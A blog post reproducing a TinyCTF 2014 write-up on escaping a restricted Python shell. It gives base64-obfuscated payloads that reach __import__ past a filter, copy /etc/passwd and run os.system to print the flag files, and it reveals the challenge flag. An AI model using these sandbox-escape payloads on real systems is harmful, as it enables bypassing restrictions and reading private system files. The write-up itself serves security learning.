---
layout: post
title: TinyCTF - not-exactly-alcatraz
categories:
- CTF
tags: [ctf]
status: publish
type: post
published: true
meta:
  _edit_last: '1'
  pw_single_layout: '1'
---

Content found at: [Tiny CTF 2014 write-ups](https://github.com/ctfs/write-ups/tree/master/tinyctf-2014/not-exactly-alcatraz "TinyCTF 2014 write-ups")

Un-zip [the provided `pwn200.zip` file](https://github.com/ctfs/write-ups/raw/master/tinyctf-2014/not-exactly-alcatraz/pwn200.zip):

{% highlight bash linenos %}
$ unzip pwn200.zip
Archive:  pwn200.zip
  inflating: pwn200
{% endhighlight %}

The extracted `pwn200` file is a Python script.

{% highlight bash linenos %}
$ python pwn200

Welcome to Safe Interactive CPython Shell (SICS)
================================================

Rules:
    - Wash your dishes
    - Don't eat the yellow snow
    - Do not import anything
    - No peeking at files!

baby@sics:~$
1 + 1
2
baby@sics:~$
open('/home/pybaby/flag.txt')
...
...
...

{% endhighlight %}

Well, we can't do anything 'normal' time for some 'exotic' code (-;

{% highlight bash linenos %}
# Well, let's try to import a library:
# X19pbXBvcnRfXw== is __import__ 
# c2h1dGls is shutil
__builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('c2h1dGls'.decode('base64')).copyfile('/etc/passwd', '/proc/self/fd/0')
# Doing so on our local box

python pwn200
>>> __builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('c2h1dGls'.decode('base64')).copyfile('/etc/passwd', '/proc/self/fd/0')
# BOOM! The password file... Okay, so this should work right?!

Nope... A socket dup'd fd doesn't like to be used like this...so back to the drawing board...

# Well, let's try to import a library again and use a system command:
# X19pbXBvcnRfXw== is __import__
# b3M= is os
__builtins__.__dict__['X19pbXBvcnRfXw=='.decode('base64')]('b3M='.decode('base64')).system("cat /home/pybaby/*.txt")

MONEY!!!

{% endhighlight %}

The flag is `flag{python_sandboxing:_harder_than_teaching_your_mom_dota}`.
